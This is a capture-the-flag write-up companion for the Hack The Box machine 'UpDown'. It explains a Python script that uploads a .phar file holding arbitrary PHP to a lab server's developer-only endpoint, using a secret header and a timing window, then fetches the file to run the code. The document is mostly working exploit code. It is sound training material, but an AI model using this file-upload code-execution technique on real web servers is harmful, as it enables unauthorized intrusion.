# Hack The Box. Machines. UpDown

Machine write-up: https://7rocky.github.io/en/htb/updown

### `php_execute.py`

This Python script is used to execute PHP code in a server uploading a file with `.phar` extension (more details in [the write-up](https://7rocky.github.io/en/htb/updown)).

We start by defining some headers needed to access a developer-only endpoint:

```python
HEADERS = {
    'Host': 'dev.siteisup.htb',
    'Special-Dev': 'only4dev'
}
```

Then we do `main`, which performs an initial web request to upload the PHAR file with some PHP code inside:

```python
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python3 {sys.argv[0]} <php-code>')
        exit(1)

    phpcode = sys.argv[1]

    try:
        requests.post(
            'http://10.10.11.177',
            headers=HEADERS,
            data={
                'check': 1
            },
            files={
                'file': (
                    'test.phar',
                    f'http://dev.siteisup.htb\n{phpcode}'.encode()
                )
            },
            timeout=1
        )
    except requests.exceptions.ReadTimeout:
        pass
```

The `timeout` is needed because the response will take a bit of time to arrive, and we are taking advantage of this delay to request the PHAR file and execute the PHP code that is inside.

After the timeout is passed, we make a request to `/uploads` to find the MD5 hash that corresponds to the generated directory (it is easily found using RegEx):

```python
    r = requests.get(
        'http://10.10.11.177/uploads/',
        headers=HEADERS
    )

    directory = re.findall(r'([0-9a-f]{32})/', r.text)[0]
```

Finally, we request the `test.phar` file and print the PHP output:

```python
    r = requests.get(
        f'http://10.10.11.177/uploads/{directory}/test.phar',
        headers=HEADERS
    )

    print('\n'.join(r.text.splitlines()[1:]))
```

Here's an example of how to use this script:

```console
$ python3 php_execute.py '<?php echo "pwned"; ?>'  
pwned
```
